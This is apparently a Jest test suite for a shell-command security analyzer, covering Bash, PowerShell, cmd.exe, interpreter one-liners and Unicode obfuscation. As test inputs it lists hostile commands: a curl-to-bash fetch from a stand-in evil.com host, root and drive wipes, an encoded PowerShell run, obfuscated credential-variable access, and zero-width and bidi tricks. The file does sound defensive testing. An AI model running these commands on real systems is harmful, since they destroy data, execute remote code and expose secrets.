import { ASTAnalyzer } from '../../src/security/ast-analyzer';
import { PowerShellASTAnalyzer } from '../../src/security/powershell-analyzer';
import { CmdAnalyzer } from '../../src/security/cmd-analyzer';
import { UnicodeNormalizer } from '../../src/security/unicode-normalizer';
import { MultiInterpreterAnalyzer } from '../../src/security/multi-interpreter-analyzer';

describe('Differential Parser & Runtime Semantic Conformance (Roadmap P2.3)', () => {
  let bashAnalyzer: ASTAnalyzer;
  let psAnalyzer: PowerShellASTAnalyzer;
  let cmdAnalyzer: CmdAnalyzer;

  beforeEach(() => {
    bashAnalyzer = new ASTAnalyzer();
    psAnalyzer = new PowerShellASTAnalyzer();
    cmdAnalyzer = new CmdAnalyzer(psAnalyzer);
  });

  describe('Bash / POSIX AST vs Real Semantics', () => {
    const testCases: Array<{ cmd: string; shouldBlock: boolean; description: string }> = [
      { cmd: 'echo $(cat /etc/passwd)', shouldBlock: true, description: 'Subshell command execution via $()' },
      { cmd: 'cat /workspace/readme.md', shouldBlock: false, description: 'Safe local workspace read' },
      { cmd: 'rm -rf /', shouldBlock: true, description: 'Destructive root wipe' },
      { cmd: 'echo "hello world"', shouldBlock: false, description: 'Benign standard echo' },
      { cmd: 'curl -s https://evil.com/malware.sh | bash', shouldBlock: true, description: 'Piping untrusted remote script to bash' },
      { cmd: 'git status', shouldBlock: false, description: 'Benign git status command' }
    ];

    testCases.forEach(({ cmd, shouldBlock, description }) => {
      it(`evaluates "${description}": ${cmd}`, () => {
        const res = bashAnalyzer.analyzeCommand(cmd);
        if (shouldBlock) {
          expect(res.isSafe).toBe(false);
        } else {
          expect(res.isSafe).toBe(true);
        }
      });
    });
  });

  describe('PowerShell AST vs Real Semantics', () => {
    const psCases: Array<{ cmd: string; shouldBlock: boolean; description: string }> = [
      { cmd: 'Get-ChildItem -Path .', shouldBlock: false, description: 'Directory listing cmdlet' },
      { cmd: 'Invoke-Expression "Remove-Item -Recurse C:\\"', shouldBlock: true, description: 'Destructive IEX execution' },
      { cmd: 'powershell.exe -enc:SUVYKCJybSAtcmYgLyIp', shouldBlock: true, description: 'Base64 encoded execution via colon flag' },
      { cmd: 'Write-Output "Processing completed"', shouldBlock: false, description: 'Benign output pipeline' }
    ];

    psCases.forEach(({ cmd, shouldBlock, description }) => {
      it(`evaluates PowerShell "${description}": ${cmd}`, () => {
        const res = psAnalyzer.analyzeCommand(cmd);
        if (shouldBlock) {
          expect(res.isSafe).toBe(false);
        } else {
          expect(res.isSafe).toBe(true);
        }
      });
    });
  });

  describe('cmd.exe vs Caret & Variable De-obfuscation', () => {
    const cmdCases: Array<{ cmd: string; shouldBlock: boolean; description: string }> = [
      { cmd: 'dir /b', shouldBlock: false, description: 'Simple directory listing' },
      { cmd: 'del /f /s /q C:\\*', shouldBlock: true, description: 'Destructive recursive wipe' },
      { cmd: 'echo %A^WS_SECRET_ACCESS_KEY%', shouldBlock: true, description: 'Caret obfuscated credential access' },
      { cmd: 'type normal_file.txt', shouldBlock: false, description: 'Reading benign workspace file' }
    ];

    cmdCases.forEach(({ cmd, shouldBlock, description }) => {
      it(`evaluates cmd.exe "${description}": ${cmd}`, () => {
        const res = cmdAnalyzer.analyzeCommand(cmd);
        if (shouldBlock) {
          expect(res.isSafe).toBe(false);
        } else {
          expect(res.isSafe).toBe(true);
        }
      });
    });
  });

  describe('Multi-Interpreter & Unicode Normalization', () => {
    it('detects Python dangerous subprocess execution', () => {
      const cmd = 'python -c "import os; os.system(\'rm -rf /\')"';
      const res = MultiInterpreterAnalyzer.analyze(cmd);
      expect(res.isSafe).toBe(false);
      expect(res.reason).toContain('Dangerous subprocess');
    });

    it('detects Node.js dangerous child_process execution', () => {
      const cmd = 'node -e "require(\'child_process\').exec(\'whoami\')"';
      const res = MultiInterpreterAnalyzer.analyze(cmd);
      expect(res.isSafe).toBe(false);
      expect(res.reason).toContain('child_process');
    });

    it('strips zero-width characters to reveal hidden command', () => {
      const obfuscated = 'rm\u200B -rf /';
      const analysis = UnicodeNormalizer.analyze(obfuscated);
      expect(analysis.hasZeroWidth).toBe(true);
      expect(analysis.normalized).toBe('rm -rf /');
    });

    it('detects Trojan Source bidirectional control characters', () => {
      const bidiPayload = 'const admin = true;\u202E/* admin check */';
      const analysis = UnicodeNormalizer.analyze(bidiPayload);
      expect(analysis.hasBidiOverrides).toBe(true);
      expect(analysis.isSuspicious).toBe(true);
    });
  });
});
